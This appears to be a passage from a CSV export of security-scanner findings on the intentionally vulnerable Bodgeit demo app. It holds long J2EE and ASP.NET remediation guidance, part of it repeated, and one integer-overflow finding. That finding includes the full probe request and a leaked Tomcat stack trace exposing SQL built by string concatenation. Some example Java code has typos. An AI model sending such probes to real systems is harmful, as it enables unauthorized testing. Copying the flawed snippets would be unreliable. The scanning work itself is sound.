options:</text> <br></br> <code> // Example to validate user selection against a list of options public Class Validator { ... public static boolean validateOption(Object[] options, Object value) { boolean isValidValue = false; try { List list = Arrays.asList(options); if (list != null) { isValidValue = list.contains(value); } } catch (Exception e) { } return isValidValue; } ... } ... // Allowed options String[] options = {""option1"", ""option2"", ""option3""); // Verify that the user selection is one of the allowed options String userSelection = request.getParameter(""userSelection""); if (Validator.validateOption(options, userSelection)) { // valid user selection, continue processing request ... } </code> <br></br> <text>[6] Field pattern</text> <text>Always check that the user input matches a pattern as defined by the functionality requirements. For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text> <text>^[a-zA-Z0-9]*$</text> <br></br> <text>Java 1.3 or earlier versions do not include any regular expression packages. Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support. </text> <text>Example to perform regular expression validation:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Apache regular expression package import org.apache.regexp.RE; import org.apache.regexp.RESyntaxException; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { RE r = new RE(expression); match = r.match(value); } return match; } ... } ... // Verify that the userName request parameter is alpha-numeric String userName = request.getParameter(""userName""); if (Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { // userName is valid, continue processing request ... } </code> <br></br> <text>Java 1.4 introduced a new regular expression package (java.util.regex). Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Java 1.4 regular expression package import java.util.regex.Pattern; import java.util.regexe.Matcher; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { match = Pattern.matches(expression, value); } return match; } ... } </code> <br></br> <text>[7] Cookie value</text> <text>Use the javax.servlet.http.Cookie object to validate the cookie value. The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text> <br></br> <text>Example to validate a required cookie value:</text> <br></br> <code> // Example to validate a required cookie value // First retrieve all available cookies submitted in the HTTP request Cookie[] cookies = request.getCookies(); if (cookies != null) { // find the ""user"" cookie for (int i=0; i<cookies.length; ++i) { if (cookies[i].getName().equals(""user"")) { // validate the cookie value if (Validator.validateRequired(cookies[i].getValue()) { // valid cookie value, continue processing request ... } } } } </code> <br></br> <text>[8] HTTP Response</text> <text>[8-1] Filter user input</text> <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities. These are the HTML sensitive characters:</text> <text>< > "" ' % ; ) ( & +</text> <br></br> <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text> <br></br> <code> // Example to filter sensitive data to prevent cross-site scripting public Class Validator { ... public static String filter(String value) { if (value == null) { return null; } StringBuffer result = new StringBuffer(value.length()); for (int i=0; i<value.length(); ++i) { switch (value.charAt(i)) { case '<': result.append(""&lt;""); break; case '>': result.append(""&gt;""); break; case '""': result.append(""&quot;""); break; case '\'': result.append(""&#39;""); break; case '%': result.append(""&#37;""); break; case ';': result.append(""&#59;""); break; case '(': result.append(""&#40;""); break; case ')': result.append(""&#41;""); break; case '&': result.append(""&amp;""); break; case '+': result.append(""&#43;""); break; default: result.append(value.charAt(i)); break; } return result; } ... } ... // Filter the HTTP response using Validator.filter PrintWriter out = response.getWriter(); // set output response out.write(Validator.filter(response)); out.close(); </code> <br></br> <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text> <br></br> <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text> <br></br> <code> // Example to filter all sensitive characters in the HTTP response using a Java Filter. // This example is for illustration purposes since it will filter all content in the response, including HTML tags! public class SensitiveCharsFilter implements Filter { ... public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { PrintWriter out = response.getWriter(); ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response); chain.doFilter(request, wrapper); CharArrayWriter caw = new CharArrayWriter(); caw.write(Validator.filter(wrapper.toString())); response.setContentType(""text/html""); response.setContentLength(caw.toString().length()); out.write(caw.toString()); out.close(); } ... public class CharResponseWrapper extends HttpServletResponseWrapper { private CharArrayWriter output; public String toString() { return output.toString(); } public CharResponseWrapper(HttpServletResponse response){ super(response); output = new CharArrayWriter(); } public PrintWriter getWriter(){ return new PrintWriter(output); } } } } </code> <br></br> <text>[8-2] Secure the cookie</text> <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie using a secure protocol, such as HTTPS or SSL.</text> <br></br> <text>Example to secure the ""user"" cookie:</text> <br></br> <code> // Example to secure a cookie, i.e. instruct the browser to // send the cookie using a secure protocol Cookie cookie = new Cookie(""user"", ""sensitive""); cookie.setSecure(true); response.addCookie(cookie); </code> <br></br> <text>RECOMMENDED JAVA TOOLS</text> <text>The two main Java frameworks for server-side validation are:</text> <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text> <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements. These rules are configured in an XML file that defines input validation rules for form fields. Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag. This filtering may be disabled by setting the 'filter=false' flag.</text> <br></br> <text>Struts defines the following basic input validators, but custom validators may also be defined:</text> <text>required: succeeds if the field contains any characters other than white space.</text> <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text> <text>range: succeeds if the value is within the values given by the min and max attributes ((value >= min) & (value <= max)).</text> <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text> <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text> <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text> <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text> <text>creditCard: succeeds if the value could be a valid credit card number.</text> <text>e-mail: succeeds if the value could be a valid e-mail address.</text> <br></br> <text>Example to validate the userName field of a loginForm using Struts Validator:</text> <code> <form-validation> <global> ... <validator name=""required"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateRequired"" msg=""errors.required""> </validator> <validator name=""mask"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateMask"" msg=""errors.invalid""> </validator> ... </global> <formset> <form name=""loginForm""> <!-- userName is required and is alpha-numeric case insensitive --> <field property=""userName"" depends=""required,mask""> <!-- message resource key to display if validation fails --> <msg name=""mask"" key=""login.userName.maskmsg""/> <arg0 key=""login.userName.displayname""/> <var> <var-name>mask</var-name> <var-value>^[a-zA-Z0-9]*$</var-value> </var> </field> ... </form> ... </formset> </form-validation> </code> <br></br> <text>[2] JavaServer Faces Technology</text> <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text> <br></br> <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text> <text>validate_doublerange: registers a DoubleRangeValidator on a component</text> <text>validate_length: registers a LengthValidator on a component</text> <text>validate_longrange: registers a LongRangeValidator on a component</text> <text>validate_required: registers a RequiredValidator on a component</text> <text>validate_stringrange: registers a StringRangeValidator on a component</text> <text>validator: registers a custom Validator on a component</text> <br></br> <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text> <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text> <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text> <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text> <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text> <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>input_text: accepts a text string of one line.</text> <text>output_text: displays a text string of one line.</text> <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>input_hidden: allows a page author to include a hidden variable in a page</text> <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text> <text>input_textarea: accepts multiple lines of text</text> <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text> <text>output_label: displays a nested component as a label for a specified input field</text> <text>output_message: displays a localized message</text> <br></br> <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text> <code> <%@ taglib uri=""http://java.sun.com/jsf/html"" prefix=""h"" %> <%@ taglib uri=""http://java.sun.com/jsf/core"" prefix=""f"" %> ... <jsp:useBean id=""UserBean"" class=""myApplication.UserBean"" scope=""session"" /> <f:use_faces> <h:form formName=""loginForm"" > <h:input_text id=""userName"" size=""20"" modelReference=""UserBean.userName""> <f:validate_required/> <f:validate_length minimum=""8"" maximum=""20""/> </h:input_text> <!-- display errors if present --> <h:output_errors id=""loginErrors"" clientId=""userName""/> <h:command_button id=""submit"" label=""Submit"" commandName=""submit"" /><p> </h:form> </f:use_faces> </code> <br></br> <br></br> <text>REFERENCES</text> <text>Java API 1.3 - </text> <link target=""http://java.sun.com/j2se/1.3/docs/api/"">http://java.sun.com/j2se/1.3/docs/api/</link> <text>Java API 1.4 - </text> <link target=""http://java.sun.com/j2se/1.4/docs/api/"">http://java.sun.com/j2se/1.4/docs/api/</link> <text>Java Servlet API 2.3 - </text> <link target=""http://java.sun.com/products/servlet/2.3/javadoc/"">http://java.sun.com/products/servlet/2.3/javadoc/</link> <text>Java Regular Expression Package - </text> <link target=""http://jakarta.apache.org/regexp/"">http://jakarta.apache.org/regexp/</link> <text>Jakarta Validator - </text> <link target=""http://jakarta.apache.org/commons/validator/"">http://jakarta.apache.org/commons/validator/</link> <text>JavaServer Faces Technology - </text> <link target=""http://java.sun.com/j2ee/javaserverfaces/"">http://java.sun.com/j2ee/javaserverfaces/</link> <br></br> <text>** Error Handling:</text> <br></br> <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern. In this pattern a Servlet acts as a Controller. A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model). The Servlet then forwards the request to a JSP (View) to render the processing results. Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text> <br></br> <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces. A good error handling strategy addresses the following items:</text> <br></br> <text>[1] Defining Errors</text> <text>[2] Reporting Errors</text> <text>[3] Rendering Errors</text> <text>[4] Error Mapping</text> <br></br> <text>[1] Defining Errors</text> <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided. Instead, the application should use error keys that map to known application failures. A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties. For example, if the ""user_name"" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text> <br></br> <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the ""user_name"" field is required;</text> <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the ""user_name"" field should be alphanumeric;</text> <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the ""user_name"" value is a duplicate in the database;</text> <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the ""user_name"" value is invalid;</text> <br></br> <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text> <br></br> <text>- ErrorKeys: defines all error keys</text> <br></br> <code> // Example: ErrorKeys defining the following error keys: // - ERROR_USERNAME_REQUIRED // - ERROR_USERNAME_ALPHANUMERIC // - ERROR_USERNAME_DUPLICATE // - ERROR_USERNAME_INVALID // ... public Class ErrorKeys { public static final String ERROR_USERNAME_REQUIRED = ""error.username.required""; public static final String ERROR_USERNAME_ALPHANUMERIC = ""error.username.alphanumeric""; public static final String ERROR_USERNAME_DUPLICATE = ""error.username.duplicate""; public static final String ERROR_USERNAME_INVALID = ""error.username.invalid""; ... } </code> <indentText> </indentText> <text>- Error: encapsulates an individual error</text> <br></br> <code> // Example: Error encapsulates an error key. // Error is serializable to support code executing in multiple JVMs. public Class Error implements Serializable { // Constructor given a specified error key public Error(String key) { this(key, null); } // Constructor given a specified error key and array of placeholder objects public Error(String key, Object[] values) { this.key = key; this.values = values; } // Returns the error key public String getKey() { return this.key; } // Returns the placeholder values public Object[] getValues() { return this.values; } private String key = null; private Object[] values = null; } </code> <br></br> <text>- Errors: encapsulates a Collection of errors</text> <br></br> <code> // Example: Errors encapsulates the Error objects being reported to the presentation layer. // Errors are stored in a HashMap where the key is the bean property name and value is an // ArrayList of Error objects. public Class Errors implements Serializable { // Adds an Error object to the Collection of errors for the specified bean property. public void addError(String property, Error error) { ArrayList propertyErrors = (ArrayList)errors.get(property); if (propertyErrors == null) { propertyErrors = new ArrayList(); errors.put(property, propertyErrors); } propertyErrors.put(error); } // Returns true if there are any errors public boolean hasErrors() { return (errors.size > 0); } // Returns the Errors for the specified property public ArrayList getErrors(String property) { return (ArrayList)errors.get(property); } private HashMap errors = new HashMap(); } </code> <br></br> <text>Using the above framework classes, here is an example to process validation errors of the ""user_name"" field:</text> <br></br> <code> // Example to process validation errors of the ""user_name"" field. Errors errors = new Errors(); String userName = request.getParameter(""user_name""); // (a) Required validation rule if (!Validator.validateRequired(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED)); } // (b) Alpha-numeric validation rule else if (!Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC)); } else { // (c) Duplicate check validation rule // We assume that there is an existing UserValidationEJB session bean that implements // a checkIfDuplicate() method to verify if the user already exists in the database. try { ... if (UserValidationEJB.checkIfDuplicate(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE)); } } catch (RemoteException e) { // log the error logger.error(""Could not validate user for specified userName: "" + userName); errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE); } } // set the errors object in a request attribute called ""errors"" request.setAttribute(""errors"", errors); ... </code> <br></br> <text>[2] Reporting Errors</text> <text>There are two ways to report web-tier application errors:</text> <text>(a) Servlet Error Mechanism</text> <text>(b) JSP Error Mechanism</text> <br></br> <text>[2-a] Servlet Error Mechanism</text> <text>A Servlet may report errors by:</text> <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text> <text>- calling response.sendError with an HTTP error code argument, OR</text> <text>- throwing an exception</text> <br></br> <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data. The following example illustrates how to forward to an input JSP (userInput.jsp):</text> <br></br> <code> // Example to forward to the userInput.jsp following user validation errors RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd != null) { rd.forward(request, response); } </code> <br></br> <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument. Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes. </text> <br></br> <text>Example to return a HTTP error:</text> <code> // Example to return a HTTP error code RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd == null) { // messages is a resource bundle with all message keys and values response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID)); } </code> <br></br> <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text> <text>- RuntimeException</text> <text>- ServletException</text> <text>- IOException</text> <br></br> <text>[2-b] JSP Error Mechanism</text> <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text> <br></br> <code> <%@ page errorPage=""/errors/userValidation.jsp"" %> </code> <br></br> <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request p...""\\n""...data exceeds space allotted for cell.","","",""
"DemoApps","","Bodgeit","82","Integer Overflow","","Info","Open","2015-10-15","IBM Security AppScan Standard","190","Integer Overflow or Wraparound","","/bodgeit/basket.jsp","quantity","","http://localhost/bodgeit/basket.jsp","Parameter: quantity=1 -> quantity=18446744073709551617","POST /bodgeit/basket.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=11 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 52 productid=11&price=0.7&quantity=18446744073709551617 HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 3088 Date: Thu, 15 Oct 2015 22:23:33 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - An exception occurred processing JSP page /basket.jsp at line 189</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>An exception occurred processing JSP page /basket.jsp at line 189</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: An exception occurred processing JSP page /basket.jsp at line 189 186: quantity += rs.getInt(&quot;quantity&quot;); 187: rs.close(); 188: stmt.close(); 189: stmt = conn.prepareStatement(&quot;UPDATE BasketContents SET quantity = &quot; + Integer.parseInt(quantity) + 190: &quot; WHERE basketid=&quot; + basketId + &quot; AND productid = &quot; + productId); 191: stmt.execute(); 192: if (Integer.parseInt(quantity) &lt; 0) { Stacktrace: org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:575) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;184467440737095516171111111111&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:583) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","The application has responded with an error message, indicating an undefined state that may expose sensitive information.","<fixRecommendations> <fixRecommendation type=""General""> <text>[1] Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values.</text> <text>[2] The application should verify that its input consists of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected.</text> <text>[3] Enforce values in their expected ranges and types. If your application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if your application expects a value in the range 10..99, then it should make sure that the value is indeed numeric, and that its value is in 10..99.</text> <text>[4] Verify that the data belongs to the set offered to the client.</text> <text>[5] Do not output debugging error messages and exceptions in a production environment.</text> </fixRecommendation> <fixRecommendation type=""ASP.NET""> <text>In order to disable debugging in ASP.NET, edit your web.config file to contain the following:</text> <text><compilation </text> <indentText> debug=""false""</indentText> <text>/></text> <br></br> <text>For more information, see ""HOW TO: Disable Debugging for ASP.NET Applications"" in: </text> <link target=""http://support.microsoft.com/default.aspx?scid=kb;en-us;815157"">http://support.microsoft.com/default.aspx?scid=kb;en-us;815157</link> <br></br> <text>You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, testing for valid dates or values within a range), plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text> <br></br> <text>To make sure that all the required parameters exist in a request, use the ""RequiredFieldValidator"" validation control. This control ensures that the user does not skip an entry in the web form.</text> <br></br> <text>To make sure user input contains only valid values, you can use one of the following validation controls:</text> <br></br> <text>[1] ""RangeValidator"": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</text> <br></br> <text>[2] ""RegularExpressionValidator"": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</text> <br></br> <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text> <br></br> <text>There are two ways to check for user input validity: </text> <br></br> <text>1. Test for a general error state: </text> <br></br> <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text> <br></br> <text>2. Test for the error state of individual controls:</text> <br></br> <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text> </fixRecommendation> <fixRecommendation type=""J2EE""> <text>** Input Data Validation:</text> <br></br> <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets. Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text> <br></br> <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text> <text>[1] Required field</text> <text>[2] Field data type (all HTTP request parameters are Strings by default)</text> <text>[3] Field length</text> <text>[4] Field range</text> <text>[5] Field options</text> <text>[6] Field pattern</text> <text>[7] Cookie values</text> <text>[8] HTTP Response</text> <br></br> <text>A good practice is to implement the above routine as static methods in a ""Validator"" utility class. The following sections describe an example validator class.</text> <br></br> <text>[1] Required field</text> <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces. </text> <br></br> <text>Example of how to validate required fields:</text> <br></br> <code> // Java example to validate required fields public Class Validator { ... public static boolean validateRequired(String value) { boolean isFieldValid = false; if (value != null && value.trim().length() > 0) { isFieldValid = true; } return isFieldValid; } ... } ... String fieldValue = request.getParameter(""fieldName""); if (Validator.validateRequired(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>[2] Field data type</text> <text>In web applications, input parameters are poorly typed. For example, all HTTP request parameters or cookie values are of type String. The developer is responsible for verifying the input is of the correct data type. Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text> <br></br> <text>Example of how to validate a numeric field (type int):</text> <br></br> <code> // Java example to validate that a field is an int number public Class Validator { ... public static boolean validateInt(String value) { boolean isFieldValid = false; try { Integer.parseInt(value); isFieldValid = true; } catch (Exception e) { isFieldValid = false; } return isFieldValid; } ... } ... // check if the HTTP request parameter is of type int String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>A good practice is to convert all HTTP request parameters to their respective data types. For example, store the ""integerValue"" of a request parameter in a request attribute and use it as shown in the following example:</text> <br></br> <code> // Example to convert the HTTP request parameter to a primitive wrapper data type // and store this value in a request attribute for further processing String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // convert fieldValue to an Integer Integer integerValue = Integer.getInteger(fieldValue); // store integerValue in a request attribute request.setAttribute(""fieldName"", integerValue); } ... // Use the request attribute for further processing Integer integerValue = (Integer)request.getAttribute(""fieldName""); ... </code> <br></br> <text>The primary Java data types that the application should handle:</text> <text>- Byte</text> <text>- Short</text> <text>- Integer</text> <text>- Long</text> <text>- Float</text> <text>- Double</text> <text>- Date</text> <br></br> <text>[3] Field length</text> <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text> <br></br> <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text> <br></br> <code> // Example to validate the field length public Class Validator { ... public static boolean validateLength(String value, int minLength, int maxLength) { String validatedValue = value; if (!validateRequired(value)) { validatedValue = """"; } return (validatedValue.length() >= minLength && validatedValue.length() <= maxLength); } ... } ... String userName = request.getParameter(""userName""); if (Validator.validateRequired(userName)) { if (Validator.validateLength(userName, 8, 20)) { // userName is valid, continue further processing ... } } </code> <br></br> <text>[4] Field range</text> <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text> <br></br> <text>Example to validate that the input numberOfChoices is between 10 and 20:</text> <br></br> <code> // Example to validate the field range public Class Validator { ... public static boolean validateRange(int value, int min, int max) { return (value >= min && value <= max); } ... } ... String fieldValue = request.getParameter(""numberOfChoices""); if (Validator.validateRequired(fieldValue)) { if (Validator.validateInt(fieldValue)) { int numberOfChoices = Integer.parseInt(fieldValue); if (Validator.validateRange(numberOfChoices, 10, 20)) { // numberOfChoices is valid, continue processing request ... } } } </code> <br></br> <text>[5] Field options</text> <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options. Remember that a malicious user can easily modify any option value. Always validate the selected user value against the allowed options as defined by the functional requirements.</text> <br></br> <text>Example to validate the user selection against a list of allowed options:</text> <br></br> <code> // Example to validate user selection against a list of options public Class Validator { ... public static boolean validateOption(Object[] options, Object value) { boolean isValidValue = false; try { List list = Arrays.asList(options); if (list != null) { isValidValue = list.contains(value); } } catch (Exception e) { } return isValidValue; } ... } ... // Allowed options String[] options = {""option1"", ""option2"", ""option3""); // Verify that the user selection is one of the allowed options String userSelection = request.getParameter(""userSelection""); if (Validator.validateOption(options, userSelection)) { // valid user selection, continue processing request ... } </code> <br></br> <text>[6] Field pattern</text> <text>Always check that the user input matches a pattern as defined by the functionality requirements. For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text> <text>^[a-zA-Z0-9]*$</text> <br></br> <text>Java 1.3 or earlier versions do not include any regular expression packages. Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support. </text> <text>Example to perform regular expression validation:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Apache regular expression package import org.apache.regexp.RE; import org.apache.regexp.RESyntaxException; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { RE r = new RE(expression); match = r.match(value); } return match; } ... } ... // Verify that the userName request parameter is alpha-numeric String userName = request.getParameter(""userName""); if (Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { // userName is valid, continue processing request ... } </code> <br></br> <text>Java 1.4 introduced a new regular expression package (java.util.regex). Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Java 1.4 regular expression package import java.util.regex.Pattern; import java.util.regexe.Matcher; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { match = Pattern.matches(expression, value); } return match; } ... } </code> <br></br> <text>[7] Cookie value</text> <text>Use the javax.servlet.http.Cookie object to validate the cookie value. The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text> <br></br> <text>Example to validate a required cookie value:</text> <br></br> <code> // Example to validate a required cookie value // First retrieve all available cookies submitted in the HTTP request Cookie[] cookies = request.getCookies(); if (cookies != null) { // find the ""user"" cookie for (int i=0; i<cookies.length; ++i) { if (cookies[i].getName().equals(""user"")) { // validate the cookie value if (Validator.validateRequired(cookies[i].getValue()) { // valid cookie value, continue processing request ... } } } } </code> <br></br> <text>[8] HTTP Response</text> <text>[8-1] Filter user input</text> <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities. These are the HTML sensitive characters:</text> <text>< > "" ' % ; ) ( & +</text> <br></br> <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text> <br></br> <code> // Example to filter sensitive data to prevent cross-site scripting public Class Validator { ... public static String filter(String value) { if (value == null) { return null; } StringBuffer result = new StringBuffer(value.length()); for (int i=0; i<value.length(); ++i) { switch (value.charAt(i)) { case '<': result.append(""&lt;""); break; case '>': result.append(""&gt;""); break; case '""': result.append(""&quot;""); break; case '\'': result.append(""&#39;""); break; case '%': result.append(""&#37;""); break; case ';': result.append(""&#59;""); break; case '(': result.append(""&#40;""); break; case ')': result.append(""&#41;""); break; case '&': result.append(""&amp;""); break; case '+': result.append(""&#43;""); break; default: result.append(value.charAt(i)); break; } return result; } ... } ... // Filter the HTTP response using Validator.filter PrintWriter out = response.getWriter(); // set output response out.write(Validator.filter(response)); out.close(); </code> <br></br> <text>The Java Servlet API 2.3 introduced Filters, which 